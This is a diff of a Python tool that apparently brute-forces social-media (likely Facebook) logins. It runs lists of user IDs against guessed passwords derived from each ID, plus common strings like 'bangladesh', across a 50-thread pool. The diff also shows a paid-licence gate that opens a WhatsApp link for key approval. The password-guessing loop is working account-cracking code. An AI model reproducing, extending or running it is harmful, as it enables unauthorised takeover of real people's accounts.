@@ -473,11 +473,8 @@ def ran():
         fb = "free"
     else:
         fb = "mbasic"
-    if meth in ["1", "a", "A"]:
-        mw = 90
-    else:
-        mw = 50
-    with ThreadPool(max_workers=mw) as heron:
+    
+    with ThreadPool(max_workers=50) as heron:
         sort.clear()
         sort.logo()
         print(" [b]    [red1]✗ [chartreuse1]Total Uid [orange3]▶  [chartreuse1]" + str(len(user)))
@@ -488,7 +485,7 @@ def ran():
             if ask in ["1", "01", "a", "A"]:
                 pwx = ["57575751", "57575752", "57273200", "59039200", "07860786", uid, xd, xd[1:]]
             else:
-                pwx = [uid, uid[:6], uid[:8], xd[4], xd[2:] , "bangladesh", "@#@#@#", "@#@#@#@#", "@@@###", "@@@@####", "১২৩৪৫৬"]
+                pwx = [uid, uid[:6], uid[:8], xd[4], xd[2:]]# , "bangladesh", "@#@#@#", "@#@#@#@#", "@@@###", "@@@@####", "১২৩৪৫৬"]
             heron.submit(ren_sub, uid, pwx, meth, user, fb)
 
 
@@ -674,6 +671,6 @@ def approve():
         
         print("your Key ->   "+showkey)
         input("This is paid tool bro. If you want to buy press enter. ")
-        tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+showkey);os.system('am start https://wa.me/+8801617687239?text='+tks)
+        tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+ showkey);os.system('am start https://wa.me/+8801617687239?text='+tks)
         sys.exit()
 approve()
